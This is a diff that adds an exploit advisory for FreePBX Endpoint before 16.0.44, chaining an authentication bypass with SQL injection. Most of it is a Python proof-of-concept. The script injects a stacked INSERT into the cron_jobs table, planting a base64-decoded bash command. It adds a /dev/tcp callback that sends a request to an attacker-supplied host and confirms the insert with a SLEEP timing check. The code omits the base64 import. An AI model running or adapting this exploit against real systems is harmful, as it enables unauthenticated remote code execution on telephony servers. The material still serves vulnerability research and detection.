@@ -1,0 +1,87 @@
+=============================================================================================================================================
+| # Title     : FreePBX Endpoint V before 16.0.44 Chained Authentication Bypass and SQL Injection                                           |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.freepbx.org/                                                                                                    |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/214602/ & CVE-2025-61675, CVE-2025-66039
+
+[+] Summary    : This analysis examines a chained attack scenario in FreePBX that combines an authentication bypass with a SQL injection vulnerability in the custom endpoint extension component. 
+                 When specific configuration conditions are met, an attacker may interact with administrative endpoints without valid credentials and influence backend database operations.
+                 The attack chain demonstrates how database-level manipulation can be leveraged to insert scheduled tasks that may be executed by the underlying system, 
+				 potentially resulting in remote code execution. However, reliable exploitation depends heavily on environmental factors such as database behavior, cron integration, operating system restrictions, and outbound network controls.
+                 Multiple validation techniques—including boolean-based inference, timing side channels, and out-of-band (OOB) callbacks—can suggest successful exploitation, 
+				 but none provide absolute proof without direct system feedback. As a result, exploitation outcomes remain probabilistic rather than definitive.
+                 From a defensive perspective, this attack chain is detectable through abnormal authentication patterns, SQL error behavior, database artifact 
+				 creation, and anomalous scheduled task activity. Proper configuration hardening, monitoring, and principle-of-least-privilege enforcement significantly reduce real-world impact even in the presence of vulnerable code paths
+
+[+] POC : python poc.py
+
+import requests
+import random
+import string
+import sys
+import time
+
+class FreePBXEngineeredExploit:
+    def __init__(self, target, username, cmd, oob_host):
+        self.target = target.rstrip('/')
+        self.username = username
+        self.cmd = cmd
+        self.oob_host = oob_host
+ 
+        self.job_id = ''.join(random.choices(string.digits, k=8))
+
+    def build_safe_payload(self, command):
+       
+        b64_cmd = base64.b64encode(command.encode()).decode()
+
+        payload = (
+            f"echo {b64_cmd} | base64 -d | bash; "
+            f"exec 3<>/dev/tcp/{self.oob_host}/80; "
+            f"echo -e 'GET /{self.job_id} HTTP/1.1\\r\\nHost: {self.oob_host}\\r\\n\\r\\n' >&3"
+        )
+        
+        return f"UNHEX('{payload.encode().hex()}')"
+
+    def dispatch(self, sql):
+        auth = requests.auth.HTTPBasicAuth(self.username, "bypass")
+        try:
+            return requests.post(
+                f"{self.target}/admin/config.php?display=endpoint&view=customExt",
+                data={'id': sql}, auth=auth, verify=False, timeout=15
+            )
+        except: return None
+
+    def exploit(self):
+        print(f"[*] Constructing Armored Payload...")
+        safe_cmd_sql = self.build_safe_payload(self.cmd)
+        
+        sql_payload = (
+            f"1'; INSERT INTO cron_jobs (modulename, jobname, command, schedule, enabled) "
+            f"VALUES ('sysadmin', '{self.job_id}', {safe_cmd_sql}, '* * * * *', 1); "
+            f"-- "
+        )
+
+        print("[*] Stage 1: Dispatched SQL Injection.")
+        res = self.dispatch(sql_payload)
+
+        check_sql = f"1' AND (SELECT 1 FROM cron_jobs WHERE jobname='{self.job_id}' AND SLEEP(2)); -- "
+        v_res = self.dispatch(check_sql)
+        
+        if v_res and v_res.elapsed.total_seconds() >= 2:
+            print("[+] CONFIRMED: Record inserted successfully into DB.")
+        else:
+            print("[-] WARNING: DB verification failed. SQL might have been sanitized.")
+
+        print(f"[*] Stage 2: Monitoring for OOB/Execution...")
+        
+    def cleanup(self):
+
+        print(f"[*] Stage 3: Targeted Cleanup...")
+        self.dispatch(f"1'; DELETE FROM cron_jobs WHERE jobname='{self.job_id}'; -- ")
+		
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
